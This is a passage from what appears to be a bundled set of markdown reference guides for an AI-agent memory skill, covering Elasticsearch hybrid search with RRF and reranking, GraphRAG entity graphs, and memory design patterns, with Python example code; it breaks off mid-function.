documents/_search\n{\n  \"size\": 10,\n  \"query\": {\n    \"bool\": {\n      \"should\": [\n        {\n          \"match\": {\n            \"content\": \"search engine\"\n          }\n        },\n        {\n          \"knn\": {\n            \"field\": \"embedding\",\n            \"query_vector\": [0.1, 0.2, ...],\n            \"k\": 50,\n            \"num_candidates\": 100\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n### 2. Hybrid Search with RRF\n\n```python\nfrom elasticsearch import Elasticsearch\n\nes = Elasticsearch(\"http://localhost:9200\")\n\ndef hybrid_search_rrf(query_text: str, query_embedding: list, k: int = 60):\n    \"\"\"Perform RRF hybrid search.\"\"\"\n\n    # Execute vector search\n    vector_results = es.search(\n        index=\"documents\",\n        knn={\n            \"field\": \"embedding\",\n            \"query_vector\": query_embedding,\n            \"k\": 50,\n            \"num_candidates\": 100\n        },\n        size=50\n    )\n\n    # Execute keyword search\n    keyword_results = es.search(\n        index=\"documents\",\n        query={\n            \"match\": {\n                \"content\": query_text\n            }\n        },\n        size=50\n    )\n\n    # Apply RRF\n    scores = {}\n\n    for rank, hit in enumerate(vector_results['hits']['hits']):\n        doc_id = hit['_id']\n        scores[doc_id] = scores.get(doc_id, 0) + 1.0 / (k + rank + 1)\n\n    for rank, hit in enumerate(keyword_results['hits']['hits']):\n        doc_id = hit['_id']\n        scores[doc_id] = scores.get(doc_id, 0) + 1.0 / (k + rank + 1)\n\n    # Sort by RRF score\n    sorted_docs = sorted(scores.items(), key=lambda x: x[1], reverse=True)\n\n    # Fetch full documents\n    doc_ids = [doc_id for doc_id, _ in sorted_docs[:10]]\n\n    results = es.mget(\n        index=\"documents\",\n        ids=doc_ids\n    )\n\n    return results['docs']\n```\n\n### 3. Custom Scoring Function\n\n```json\nGET documents/_search\n{\n  \"size\": 10,\n  \"query\": {\n    \"function_score\": {\n      \"query\": {\n        \"match\": {\n          \"content\": \"search engine\"\n        }\n      },\n      \"functions\": [\n        {\n          \"filter\": {\n            \"exists\": {\n              \"field\": \"embedding\"\n            }\n          },\n          \"script_score\": {\n            \"script\": {\n              \"source\": \"cosineSimilarity(params.query_vector, 'embedding') + 1.0\",\n              \"params\": {\n                \"query_vector\": [0.1, 0.2, ...]\n              }\n            }\n          }\n        }\n      ],\n      \"score_mode\": \"sum\",\n      \"boost_mode\": \"sum\"\n    }\n  }\n}\n```\n\n## Advanced Hybrid Patterns\n\n### 1. RRF with Parallel Execution\n\n```python\nimport asyncio\nfrom elasticsearch import AsyncElasticsearch\n\nasync def async_hybrid_search(\n    es: AsyncElasticsearch,\n    query_text: str,\n    query_embedding: list,\n    k: int = 60\n):\n    \"\"\"Async hybrid search with RRF.\"\"\"\n\n    # Execute both searches in parallel\n    vector_task = es.search(\n        index=\"documents\",\n        knn={\n            \"field\": \"embedding\",\n            \"query_vector\": query_embedding,\n            \"k\": 50,\n            \"num_candidates\": 100\n        },\n        size=50\n    )\n\n    keyword_task = es.search(\n        index=\"documents\",\n        query={\n            \"match\": {\n                \"content\": query_text\n            }\n        },\n        size=50\n    )\n\n    # Wait for both to complete\n    vector_results, keyword_results = await asyncio.gather(\n        vector_task, keyword_task\n    )\n\n    # Apply RRF\n    scores = {}\n\n    for rank, hit in enumerate(vector_results['hits']['hits']):\n        doc_id = hit['_id']\n        scores[doc_id] = scores.get(doc_id, 0) + 1.0 / (k + rank + 1)\n\n    for rank, hit in enumerate(keyword_results['hits']['hits']):\n        doc_id = hit['_id']\n        scores[doc_id] = scores.get(doc_id, 0) + 1.0 / (k + rank + 1)\n\n    # Sort and return\n    sorted_docs = sorted(scores.items(), key=lambda x: x[1], reverse=True)\n    return sorted_docs[:10]\n```\n\n### 2. Weighted Linear Combination\n\n```python\ndef hybrid_search_linear(\n    es: Elasticsearch,\n    query_text: str,\n    query_embedding: list,\n    alpha: float = 0.5\n):\n    \"\"\"Linear combination of vector and keyword scores.\"\"\"\n\n    # Get vector search results\n    vector_results = es.search(\n        index=\"documents\",\n        knn={\n            \"field\": \"embedding\",\n            \"query_vector\": query_embedding,\n            \"k\": 50\n        },\n        size=50\n    )\n\n    # Get keyword search results\n    keyword_results = es.search(\n        index=\"documents\",\n        query={\n            \"match\": {\n                \"content\": query_text\n            }\n        },\n        size=50\n    )\n\n    # Normalize scores\n    vector_scores = {\n        hit['_id']: hit['_score']\n        for hit in vector_results['hits']['hits']\n    }\n\n    keyword_scores = {\n        hit['_id']: hit['_score']\n        for hit in keyword_results['hits']['hits']\n    }\n\n    # Combine scores\n    all_ids = set(vector_scores.keys()) | set(keyword_scores.keys())\n    combined_scores = {}\n\n    for doc_id in all_ids:\n        v_score = vector_scores.get(doc_id, 0)\n        k_score = keyword_scores.get(doc_id, 0)\n        combined_scores[doc_id] = alpha * v_score + (1 - alpha) * k_score\n\n    # Sort by combined score\n    sorted_docs = sorted(\n        combined_scores.items(),\n        key=lambda x: x[1],\n        reverse=True\n    )\n\n    return sorted_docs[:10]\n```\n\n## Reranking with Cross-Encoder\n\n### 1. Fetch Candidates\n\n```python\ndef get_candidates(\n    es: Elasticsearch,\n    query_embedding: list,\n    query_text: str,\n    num_candidates: int = 100\n):\n    \"\"\"Get hybrid search candidates for reranking.\"\"\"\n\n    # Combine results from both searches\n    vector_results = es.search(\n        index=\"documents\",\n        knn={\n            \"field\": \"embedding\",\n            \"query_vector\": query_embedding,\n            \"k\": num_candidates\n        },\n        size=num_candidates\n    )\n\n    keyword_results = es.search(\n        index=\"documents\",\n        query={\n            \"match\": {\n                \"content\": query_text\n            }\n        },\n        size=num_candidates\n    )\n\n    # Get unique documents\n    candidates = {}\n    for hit in vector_results['hits']['hits']:\n        candidates[hit['_id']] = hit['_source']\n\n    for hit in keyword_results['hits']['hits']:\n        candidates[hit['_id']] = hit['_source']\n\n    return list(candidates.values())\n```\n\n### 2. Rerank with Cross-Encoder\n\n```python\nfrom sentence_transformers import CrossEncoder\n\ndef rerank_with_cross_encoder(\n    candidates: list,\n    query: str,\n    model_name: str = 'cross-encoder/ms-marco-MiniLM-L-6-v2'\n):\n    \"\"\"Rerank candidates using cross-encoder.\"\"\"\n\n    model = CrossEncoder(model_name)\n\n    # Prepare query-document pairs\n    pairs = [(query, doc['content']) for doc in candidates]\n\n    # Get scores\n    scores = model.predict(pairs)\n\n    # Add scores to documents\n    for doc, score in zip(candidates, scores):\n        doc['rerank_score'] = score\n\n    # Sort by rerank score\n    reranked = sorted(candidates, key=lambda x: x['rerank_score'], reverse=True)\n\n    return reranked\n```\n\n## Performance Optimization\n\n### 1. Index Optimization\n\n```json\nPUT documents\n{\n  \"settings\": {\n    \"number_of_shards\": 3,\n    \"number_of_replicas\": 1,\n    \"index\": {\n      \"knn\": true,\n      \"knn.algo_param\": {\n        \"ef_construction\": 128,\n        \"m\": 16\n      },\n      \"refresh_interval\": \"30s\"\n    }\n  }\n}\n```\n\n### 2. Query Optimization\n\n```json\nGET documents/_search\n{\n  \"knn\": {\n    \"field\": \"embedding\",\n    \"query_vector\": [...],\n    \"k\": 50,\n    \"num_candidates\": 100,\n    \"boost\": 1.0\n  },\n  \"_source\": [\"id\", \"content\"]\n}\n```\n\n### 3. Caching\n\n```python\nfrom functools import lru_cache\n\n@lru_cache(maxsize=1000)\ndef get_embedding(query_hash: str):\n    \"\"\"Cache query embeddings.\"\"\"\n    return model.encode(query_text)\n```\n\n## Complete Example\n\n### Full Hybrid Search Pipeline\n\n```python\nclass ElasticsearchHybridSearch:\n    def __init__(self, es_host: str = \"http://localhost:9200\"):\n        self.es = Elasticsearch(es_host)\n        self.model = SentenceTransformer('all-MiniLM-L6-v2')\n        self.reranker = CrossEncoder('cross-encoder/ms-marco-MiniLM-L-6-v2')\n\n    def hybrid_search(\n        self,\n        query: str,\n        method: str = 'rrf',\n        alpha: float = 0.5,\n        k: int = 60,\n        use_reranking: bool = False,\n        num_rerank: int = 50\n    ):\n        \"\"\"Complete hybrid search pipeline.\"\"\"\n\n        # Get query embedding\n        query_embedding = self.model.encode(query).tolist()\n\n        # Get candidates\n        candidates = self.get_candidates(query, query_embedding, num_candidates=100)\n\n        # Apply fusion\n        if method == 'rrf':\n            results = self.apply_rrf(candidates, k=k)\n        elif method == 'linear':\n            results = self.apply_linear(candidates, alpha=alpha)\n        else:\n            raise ValueError(f\"Unknown method: {method}\")\n\n        # Apply reranking if requested\n        if use_reranking and results:\n            results = self.apply_reranking(results[:num_rerank], query)\n\n        return results\n\n    def get_candidates(self, query: str, query_embedding: list, num_candidates: int = 100):\n        \"\"\"Get hybrid search candidates.\"\"\"\n\n        # Vector search\n        vector_results = self.es.search(\n            index=\"documents\",\n            knn={\n                \"field\": \"embedding\",\n                \"query_vector\": query_embedding,\n                \"k\": num_candidates\n            },\n            size=num_candidates\n        )\n\n        # Keyword search\n        keyword_results = self.es.search(\n            index=\"documents\",\n            query={\n                \"match\": {\n                    \"content\": query\n                }\n            },\n            size=num_candidates\n        )\n\n        # Combine candidates\n        candidates = {}\n        for hit in vector_results['hits']['hits']:\n            candidates[hit['_id']] = hit['_source']\n\n        for hit in keyword_results['hits']['hits']:\n            candidates[hit['_id']] = hit['_source']\n\n        return list(candidates.values())\n\n    def apply_rrf(self, candidates: list, k: int = 60):\n        \"\"\"Apply RRF fusion.\"\"\"\n\n        scores = {}\n        for rank, doc in enumerate(candidates):\n            doc_id = doc['id']\n            scores[doc_id] = scores.get(doc_id, 0) + 1.0 / (k + rank + 1)\n\n        return sorted(\n            [{**doc, 'score': scores[doc['id']]} for doc in candidates],\n            key=lambda x: x['score'],\n            reverse=True\n        )\n\n    def apply_linear(self, candidates: list, alpha: float = 0.5):\n        \"\"\"Apply linear combination.\"\"\"\n\n        # Normalize scores (simplified)\n        max_score = max(doc.get('score', 0) for doc in candidates)\n\n        for doc in candidates:\n            if 'score' not in doc:\n                doc['score'] = 0\n            doc['score'] = alpha * doc['score']\n\n        return sorted(candidates, key=lambda x: x['score'], reverse=True)\n\n    def apply_reranking(self, candidates: list, query: str):\n        \"\"\"Apply cross-encoder reranking.\"\"\"\n\n        pairs = [(query, doc['content']) for doc in candidates]\n        scores = self.reranker.predict(pairs)\n\n        for doc, score in zip(candidates, scores):\n            doc['rerank_score'] = score\n\n        return sorted(candidates, key=lambda x: x['rerank_score'], reverse=True)\n```\n\n## Advantages\n\n1. **Native vector support** - Built-in kNN search\n2. **Scalable** - Designed for distributed systems\n3. **Rich query DSL** - Flexible and expressive\n4. **Real-time** - Near real-time indexing and search\n5. **Analytics** - Built-in monitoring and observability\n\n## Considerations\n\n1. **Resource intensive** - Requires significant RAM for vector indexes\n2. **Complexity** - More configuration than PostgreSQL\n3. **Cost** - Higher infrastructure costs at scale\n4. **Learning curve** - Elasticsearch-specific knowledge required\n\n## Best Practices\n\n1. **Tune HNSW parameters** - Balance accuracy and performance\n2. **Use async clients** - Improve throughput\n3. **Implement caching** - Reduce duplicate computations\n4. **Monitor query latency** - Track performance metrics\n5. **Use bulk operations** - Improve indexing throughput\n6. **Shard appropriately** - Distribute data across nodes\n7. **Enable circuit breakers** - Prevent cluster instability\n",
        "plugins/sys-agents/skills/architecting-memory/references/graph-rag.md": "# GraphRAG Implementation Guide\n\nComplete guide to implementing GraphRAG (Graph-based Retrieval-Augmented Generation) for relationship modeling.\n\n## Architecture Overview\n\n```\nQUERY  Entity Extraction  Graph Traversal  Retrieve  Rank  Context\n```\n\n## Core Components\n\n### 1. Entity Extraction\n\n```python\nimport spacy\nfrom typing import List, Tuple\n\nclass EntityExtractor:\n    def __init__(self):\n        self.nlp = spacy.load(\"en_core_web_sm\")\n\n    def extract_entities(self, text: str) -> List[dict]:\n        \"\"\"Extract entities from text\"\"\"\n        doc = self.nlp(text)\n\n        entities = []\n        for ent in doc.ents:\n            entities.append({\n                \"id\": f\"{ent.label_}_{ent.text}\",\n                \"label\": ent.label_,\n                \"text\": ent.text,\n                \"start\": ent.start_char,\n                \"end\": ent.end_char\n            })\n\n        return entities\n\n    def extract_relationships(self, text: str, entities: List[dict]) -> List[dict]:\n        \"\"\"Extract relationships between entities\"\"\"\n        doc = self.nlp(text)\n\n        relationships = []\n        for sent in doc.sents:\n            sent_ents = [e for e in entities if e[\"text\"] in sent.text]\n\n            # Simple pattern matching for relationships\n            for i, ent1 in enumerate(sent_ents):\n                for ent2 in sent_ents[i+1:]:\n                    if self._are_related(sent, ent1, ent2):\n                        relationships.append({\n                            \"source\": ent1[\"id\"],\n                            \"target\": ent2[\"id\"],\n                            \"type\": self._determine_relationship(sent, ent1, ent2),\n                            \"context\": sent.text\n                        })\n\n        return relationships\n\n    def _are_related(self, sentence, ent1: dict, ent2: dict) -> bool:\n        \"\"\"Check if two entities are related in the sentence\"\"\"\n        # Simple heuristic: both in same sentence and close to each other\n        return True  # Simplified\n\n    def _determine_relationship(self, sentence, ent1: dict, ent2: dict) -> str:\n        \"\"\"Determine relationship type\"\"\"\n        # Use dependency parsing or patterns\n        return \"RELATED_TO\"  # Simplified\n```\n\n### 2. Knowledge Graph Construction\n\n```python\nimport networkx as nx\nfrom typing import Set\n\nclass KnowledgeGraph:\n    def __init__(self):\n        self.graph = nx.MultiDiGraph()\n        self.entity_cache = {}\n\n    def add_entity(self, entity: dict):\n        \"\"\"Add entity to graph\"\"\"\n        self.graph.add_node(\n            entity[\"id\"],\n            label=entity[\"label\"],\n            text=entity[\"text\"],\n            type=\"entity\"\n        )\n        self.entity_cache[entity[\"id\"]] = entity\n\n    def add_relationship(self, relationship: dict):\n        \"\"\"Add relationship to graph\"\"\"\n        self.graph.add_edge(\n            relationship[\"source\"],\n            relationship[\"target\"],\n            type=relationship[\"type\"],\n            context=relationship.get(\"context\", \"\"),\n            weight=1.0\n        )\n\n    def add_document(self, entities: List[dict], relationships: List[dict]):\n        \"\"\"Add document to graph\"\"\"\n        for entity in entities:\n            self.add_entity(entity)\n\n        for rel in relationships:\n            self.add_relationship(rel)\n\n    def get_entity(self, entity_id: str) -> dict:\n        \"\"\"Get entity by ID\"\"\"\n        return self.entity_cache.get(entity_id)\n\n    def get_neighbors(self, entity_id: str, relationship_type: str = None) -> Set[str]:\n        \"\"\"Get neighboring entities\"\"\"\n        if relationship_type:\n            return {\n                neighbor\n                for _, neighbor, data in self.graph.edges(entity_id, data=True)\n                if data.get(\"type\") == relationship_type\n            }\n        else:\n            return set(self.graph.neighbors(entity_id))\n\n    def find_path(self, source: str, target: str, max_length: int = 3) -> List[str]:\n        \"\"\"Find path between two entities\"\"\"\n        try:\n            path = nx.shortest_path(self.graph, source, target, weight=\"weight\")\n            return path\n        except nx.NetworkXNoPath:\n            return []\n```\n\n### 3. GraphRAG Retrieval\n\n```python\nclass GraphRAGRetriever:\n    def __init__(self, graph: KnowledgeGraph, vector_db, embedding_func):\n        self.graph = graph\n        self.vector_db = vector_db\n        self.embedding_func = embedding_func\n\n    def retrieve(self, query: str, top_k: int = 5) -> List[dict]:\n        \"\"\"Retrieve relevant information using graph + vector search\"\"\"\n\n        # Extract entities from query\n        entity_extractor = EntityExtractor()\n        query_entities = entity_extractor.extract_entities(query)\n\n        # Get initial candidates from vector search\n        vector_results = self.vector_db.query(\n            query_embeddings=[self.embedding_func.embed_query(query)],\n            n_results=top_k * 2\n        )\n\n        # Expand using graph traversal\n        expanded_entities = self._expand_entities(query_entities)\n\n        # Combine and rank\n        combined_results = self._combine_and_rank(\n            vector_results,\n            expanded_entities,\n            query\n        )\n\n        return combined_results[:top_k]\n\n    def _expand_entities(self, query_entities: List[dict], max_depth: int = 2) -> Set[str]:\n        \"\"\"Expand entities using graph traversal\"\"\"\n        expanded = set()\n        queue = [(e[\"id\"], 0) for e in query_entities]\n        visited = set()\n\n        while queue:\n            entity_id, depth = queue.pop(0)\n\n            if entity_id in visited or depth > max_depth:\n                continue\n\n            visited.add(entity_id)\n            expanded.add(entity_id)\n\n            # Add neighbors\n            for neighbor in self.graph.get_neighbors(entity_id):\n                if neighbor not in visited:\n                    queue.append((neighbor, depth + 1))\n\n        return expanded\n\n    def _combine_and_rank(self, vector_results: dict, entities: Set[str], query: str):\n        \"\"\"Combine vector and graph results\"\"\"\n        # Implementation for combining and ranking\n        # ...\n        pass\n```\n\n## Graph Traversal Strategies\n\n### Breadth-First Search (BFS)\n```python\ndef bfs_traversal(graph: nx.Graph, start_entity: str, max_depth: int = 2):\n    \"\"\"Traverse graph using BFS\"\"\"\n    visited = set()\n    queue = [(start_entity, 0)]\n    results = []\n\n    while queue:\n        entity, depth = queue.pop(0)\n\n        if entity in visited or depth > max_depth:\n            continue\n\n        visited.add(entity)\n        results.append({\n            \"entity\": entity,\n            \"depth\": depth\n        })\n\n        for neighbor in graph.neighbors(entity):\n            if neighbor not in visited:\n                queue.append((neighbor, depth + 1))\n\n    return results\n```\n\n### Depth-First Search (DFS)\n```python\ndef dfs_traversal(graph: nx.Graph, start_entity: str, max_depth: int = 2):\n    \"\"\"Traverse graph using DFS\"\"\"\n    visited = set()\n    stack = [(start_entity, 0)]\n    results = []\n\n    while stack:\n        entity, depth = stack.pop()\n\n        if entity in visited or depth > max_depth:\n            continue\n\n        visited.add(entity)\n        results.append({\n            \"entity\": entity,\n            \"depth\": depth\n        })\n\n        for neighbor in graph.neighbors(entity):\n            if neighbor not in visited:\n                stack.append((neighbor, depth + 1))\n\n    return results\n```\n\n### Personalized PageRank\n```python\ndef personalized_pagerank(graph: nx.Graph, seed_entities: List[str], alpha: float = 0.85):\n    \"\"\"Compute Personalized PageRank for entity ranking\"\"\"\n    # Create personalization vector\n    personalization = {node: 0.0 for node in graph.nodes()}\n    for seed in seed_entities:\n        if seed in personalization:\n            personalization[seed] = 1.0 / len(seed_entities)\n\n    # Compute PageRank\n    pagerank_scores = nx.pagerank(\n        graph,\n        alpha=alpha,\n        personalization=personalization\n    )\n\n    # Sort by score\n    ranked_entities = sorted(\n        pagerank_scores.items(),\n        key=lambda x: x[1],\n        reverse=True\n    )\n\n    return ranked_entities\n```\n\n## Entity Linking\n\n### Linking New Entities to Graph\n```python\nclass EntityLinker:\n    def __init__(self, graph: KnowledgeGraph, embedding_func):\n        self.graph = graph\n        self.embedding_func = embedding_func\n\n    def link_entity(self, new_entity: dict, threshold: float = 0.8) -> str:\n        \"\"\"Link new entity to existing graph entities\"\"\"\n        new_embedding = self.embedding_func.embed_query(new_entity[\"text\"])\n\n        best_match = None\n        best_score = 0\n\n        # Compare with existing entities\n        for entity_id in self.graph.graph.nodes():\n            entity = self.graph.get_entity(entity_id)\n            entity_embedding = self.embedding_func.embed_query(entity[\"text\"])\n\n            similarity = cosine_similarity([new_embedding], [entity_embedding])[0][0]\n\n            if similarity > threshold and similarity > best_score:\n                best_match = entity_id\n                best_score = similarity\n\n        return best_match if best_match else None\n\n    def merge_entities(self, entity1_id: str, entity2_id: str, relationship_type: str):\n        \"\"\"Merge two entities in the graph\"\"\"\n        # Merge nodes\n        # This is a simplified implementation\n        # In practice, you'd want to handle conflicts carefully\n        pass\n```\n\n## Graph Augmentation\n\n### Automatic Relationship Discovery\n```python\nclass RelationshipDiscovery:\n    def __init__(self, graph: KnowledgeGraph):\n        self.graph = graph\n\n    def discover_implicit_relationships(self, entity_pair: Tuple[str, str]) -> List[dict]:\n        \"\"\"Discover implicit relationships using path analysis\"\"\"\n        entity1, entity2 = entity_pair\n\n        # Find all paths between entities\n        paths = self._find_all_paths(entity1, entity2, max_length=3)\n\n        # Extract relationship patterns\n        patterns = []\n        for path in paths:\n            pattern = self._extract_pattern(path)\n            patterns.append(pattern)\n\n        return patterns\n\n    def _find_all_paths(self, start: str, end: str, max_length: int = 3):\n        \"\"\"Find all paths between two entities\"\"\"\n        paths = []\n        self._dfs_paths(start, end, max_length, [], paths)\n        return paths\n\n    def _dfs_paths(self, current: str, end: str, max_length: int, path: List[str], all_paths: List[List[str]]):\n        \"\"\"DFS to find paths\"\"\"\n        if len(path) > max_length:\n            return\n\n        if current == end:\n            all_paths.append(path + [current])\n            return\n\n        if current in path:\n            return\n\n        for neighbor in self.graph.get_neighbors(current):\n            self._dfs_paths(neighbor, end, max_length, path + [current], all_paths)\n```\n\n## Query Processing\n\n### Multi-Hop Reasoning\n```python\ndef multi_hop_reasoning(graph: nx.Graph, query: str, num_hops: int = 2):\n    \"\"\"Perform multi-hop reasoning on graph\"\"\"\n    # Extract entities from query\n    entity_extractor = EntityExtractor()\n    query_entities = entity_extractor.extract_entities(query)\n\n    # For each pair of query entities, find paths\n    reasoning_chains = []\n    for i, ent1 in enumerate(query_entities):\n        for ent2 in query_entities[i+1:]:\n            path = graph.find_path(ent1[\"id\"], ent2[\"id\"], max_length=num_hops)\n            if path:\n                reasoning_chains.append(path)\n\n    return reasoning_chains\n```\n\n## Graph Construction from Documents\n\n### Batch Processing\n```python\ndef build_graph_from_documents(documents: List[dict], graph: KnowledgeGraph):\n    \"\"\"Build knowledge graph from batch of documents\"\"\"\n    entity_extractor = EntityExtractor()\n\n    for doc_id, content in documents:\n        # Extract entities\n        entities = entity_extractor.extract_entities(content)\n\n        # Extract relationships\n        relationships = entity_extractor.extract_relationships(content, entities)\n\n        # Add to graph\n        graph.add_document(entities, relationships)\n\n        # Store document in vector DB\n        vector_db.add(\n            ids=[doc_id],\n            documents=[content],\n            metadatas=[{\n                \"entities\": [e[\"id\"] for e in entities],\n                \"relationships\": [r[\"type\"] for r in relationships]\n            }]\n        )\n```\n\n## Best Practices\n\n### Do's\nGOOD Use domain-specific entity extraction models\nGOOD Validate relationships before adding to graph\nGOOD Implement entity linking to avoid duplicates\nGOOD Use graph traversal for context expansion\nGOOD Cache graph queries for performance\nGOOD Monitor graph size and complexity\n\n### Don'ts\nBAD Don't add all entities without validation\nBAD Don't ignore entity linking\nBAD Don't use deep graph traversal (>3 hops)\nBAD Don't forget to update embeddings\nBAD Don't store low-confidence relationships\nBAD Don't ignore graph maintenance\n\n## Performance Considerations\n\n### Graph Size Management\n```python\ndef manage_graph_size(graph: KnowledgeGraph, max_nodes: int = 100000):\n    \"\"\"Manage graph size by removing old/low-value nodes\"\"\"\n    if len(graph.graph.nodes()) > max_nodes:\n        # Remove nodes with low PageRank scores\n        pagerank = nx.pagerank(graph.graph)\n\n        # Sort and remove bottom 10%\n        sorted_nodes = sorted(pagerank.items(), key=lambda x: x[1])\n        nodes_to_remove = [node for node, _ in sorted_nodes[:len(sorted_nodes) // 10]]\n\n        graph.graph.remove_nodes_from(nodes_to_remove)\n```\n\n### Caching Graph Queries\n```python\nfrom functools import lru_cache\n\nclass GraphRAGRetriever:\n    def __init__(self, graph: KnowledgeGraph, vector_db, embedding_func):\n        self.graph = graph\n        self.vector_db = vector_db\n        self.embedding_func = embedding_func\n        self._cache = {}\n\n    @lru_cache(maxsize=1000)\n    def cached_traversal(self, entity_id: str, max_depth: int):\n        \"\"\"Cache graph traversal results\"\"\"\n        return self.graph.bfs_traversal(entity_id, max_depth)\n```\n\n## Evaluation\n\n### Graph Quality Metrics\n```python\ndef evaluate_graph(graph: KnowledgeGraph, ground_truth: dict):\n    \"\"\"Evaluate graph construction quality\"\"\"\n    metrics = {\n        \"entity_precision\": calculate_entity_precision(graph, ground_truth),\n        \"entity_recall\": calculate_entity_recall(graph, ground_truth),\n        \"relationship_precision\": calculate_relationship_precision(graph, ground_truth),\n        \"relationship_recall\": calculate_relationship_recall(graph, ground_truth)\n    }\n\n    return metrics\n```\n\n### Retrieval Evaluation\n```python\ndef evaluate_graphrag(queries: List[str], relevant_docs: dict, retrieved_docs: dict):\n    \"\"\"Evaluate GraphRAG retrieval quality\"\"\"\n    # Similar to vector RAG evaluation\n    # But consider multi-hop reasoning\n    pass\n```\n",
        "plugins/sys-agents/skills/architecting-memory/references/patterns.md": "# Memory System Design Patterns\n\nCommon design patterns for memory systems in AI agent architectures.\n\n## Pattern 1: Progressive Enhancement\n\n### Description\nStart with a simple memory system and gradually add complexity as needs grow.\n\n### Implementation\n```python\nclass ProgressiveMemorySystem:\n    def __init__(self):\n        self.phase = 1  # Start with Vector RAG\n        self.components = {\n            \"vector_db\": None,\n            \"knowledge_graph\": None,\n            \"temporal_graph\": None\n        }\n\n    def upgrade(self, phase: int):\n        \"\"\"Upgrade to next phase\"\"\"\n        if phase == 2 and self.phase < 2:\n            self._add_knowledge_graph()\n        elif phase == 3 and self.phase < 3:\n            self._add_temporal_graph()\n\n        self.phase = phase\n\n    def _add_knowledge_graph(self):\n        \"\"\"Add GraphRAG capabilities\"\"\"\n        self.components[\"knowledge_graph\"] = KnowledgeGraph()\n        # Implementation details...\n\n    def query(self, query: str) -> dict:\n        if self.phase == 1:\n            return self._vector_rag_query(query)\n        elif self.phase == 2:\n            return self._graph_rag_query(query)\n        elif self.phase == 3:\n            return self._temporal_query(query)\n```\n\n### Benefits\n- GOOD Incremental complexity\n- GOOD Early value delivery\n- GOOD Learning curve management\n- GOOD Proven value at each stage\n\n### Use When\n- Uncertain about future requirements\n- Need to prove value quickly\n- Limited initial resources\n- Want to validate approach\n\n## Pattern 2: Layered Memory\n\n### Description\nSeparate memory into distinct layers with clear responsibilities and interfaces.\n\n### Implementation\n```python\nclass LayeredMemory:\n    def __init__(self):\n        self.layers = {\n            \"perception\": PerceptionLayer(),      # Raw input\n            \"working\": WorkingMemory(),           # Active context\n            \"episodic\": EpisodicMemory(),        # Experience\n            \"semantic\": SemanticMemory(),        # Knowledge\n            \"procedural\": ProceduralMemory()     # Skills\n        }\n\n    def process_input(self, input_data: dict):\n        \"\"\"Process input through layers\"\"\"\n        # Perception  Working  Episodic\n        processed = self.layers[\"perception\"].process(input_data)\n        self.layers[\"working\"].update(processed)\n\n        # Episodic  Semantic (consolidation)\n        if self.layers[\"working\"].is_full():\n            episode = self.layers[\"working\"].extract()\n            self.layers[\"episodic\"].store(episode)\n\n            # Consolidate to semantic memory\n            self.layers[\"semantic\"].consolidate(episode)\n\n    def recall(self, query: str) -> dict:\n        \"\"\"Recall from appropriate layer\"\"\"\n        # Working memory first (fast access)\n        working_result = self.layers[\"working\"].query(query)\n        if working_result:\n            return working_result\n\n        # Semantic memory (knowledge)\n        semantic_result = self.layers[\"semantic\"].query(query)\n        if semantic_result:\n            return semantic_result\n\n        # Episodic memory (experiences)\n        episodic_result = self.layers[\"episodic\"].query(query)\n        return episodic_result\n```\n\n### Benefits\n- GOOD Clear separation of concerns\n- GOOD Modular architecture\n- GOOD Easy to test and debug\n- GOOD Scalable design\n\n### Use When\n- Complex memory requirements\n- Need to isolate different types of memory\n- Want clear interfaces\n- Testing is critical\n\n## Pattern 3: Observer Pattern for Memory Events\n\n### Description\nUse observer pattern to notify components when memory changes.\n\n### Implementation\n```python\nclass MemoryEvent:\n    def __init__(self, event_type: str, data: dict):\n        self.type = event_type\n        self.data = data\n        self.timestamp = datetime.now()\n\nclass MemoryObservable:\n    def __init__(self):\n        self.observers = []\n\n    def add_observer(self, observer: callable):\n        \"\"\"Add observer to memory changes\"\"\"\n        self.observers.append(observer)\n\n    def notify(self, event: MemoryEvent):\n        \"\"\"Notify all observers of memory event\"\"\"\n        for observer in self.observers:\n            try:\n                observer(event)\n            except Exception as e:\n                print(f\"Observer error: {e}\")\n\nclass MemoryManager(MemoryObservable):\n    def __init__(self):\n        super().__init__()\n        self.memory = {}\n\n    def store(self, key: str, value: any):\n        \"\"\"Store in memory and notify\"\"\"\n        old_value = self.memory.get(key)\n        self.memory[key] = value\n\n        # Notify observers\n        self.notify(MemoryEvent(\"store\", {\n            \"key\": key,\n            \"old_value\": old_value,\n            \"new_value\": value\n        }))\n\n    def update(self, key: str, value: any):\n        \"\"\"Update memory and notify\"\"\"\n        old_value = self.memory.get(key)\n        self.memory[key] = value\n\n        self.notify(MemoryEvent(\"update\", {\n            \"key\": key,\n            \"old_value\": old_value,\n            \"new_value\": value\n        }))\n\n# Usage example\ndef memory_change_handler(event: MemoryEvent):\n    if event.type == \"store\":\n        print(f\"Stored: {event.data['key']}\")\n    elif event.type == \"update\":\n        print(f\"Updated: {event.data['key']}\")\n\nmemory_manager = MemoryManager()\nmemory_manager.add_observer(memory_change_handler)\n```\n\n### Benefits\n- GOOD Decoupled components\n- GOOD Event-driven architecture\n- GOOD Easy to add monitoring\n- GOOD Reactive updates\n\n### Use When\n- Multiple components need to react to memory changes\n- Want to monitor memory usage\n- Need event-driven architecture\n- Loose coupling is important\n\n## Pattern 4: Repository Pattern for Memory Abstraction\n\n### Description\nAbstract memory storage implementation behind a common interface.\n\n### Implementation\n```python\nfrom abc import ABC, abstractmethod\nfrom typing import List, Optional, Dict, Any\n\nclass MemoryRepository(ABC):\n    @abstractmethod\n    def store(self, key: str, value: Any, metadata: Dict = None):\n        pass\n\n    @abstractmethod\n    def retrieve(self, key: str) -> Optional[Any]:\n        pass\n\n    @abstractmethod\n    def search(self, query: str, filters: Dict = None) -> List[Dict]:\n        pass\n\n    @abstractmethod\n    def delete(self, key: str):\n        pass\n\nclass VectorMemoryRepository(MemoryRepository):\n    def __init__(self, vector_db):\n        self.vector_db = vector_db\n\n    def store(self, key: str, value: Any, metadata: Dict = None):\n        embedding = self.embed(value)\n        self.vector_db.add(\n            ids=[key],\n            documents=[value],\n            embeddings=[embedding],\n            metadatas=[metadata or {}]\n        )\n\n    def retrieve(self, key: str) -> Optional[Any]:\n        results = self.vector_db.get(ids=[key])\n        if results[\"documents\"] and results[\"documents\"][0]:\n            return {\n                \"value\": results[\"documents\"][0][0],\n                \"metadata\": results[\"metadatas\"][0][0]\n            }\n        return None\n\n    def search(self, query: str, filters: Dict = None) -> List[Dict]:\n        query_embedding = self.embed(query)\n        results = self.vector_db.query(\n            query_embeddings=[query_embedding],\n            n_results=10,\n            where=filters\n        )\n        return [\n            {\n                \"value\": results[\"documents\"][0][i],\n                \"metadata\": results[\"metadatas\"][0][i],\n                \"score\": 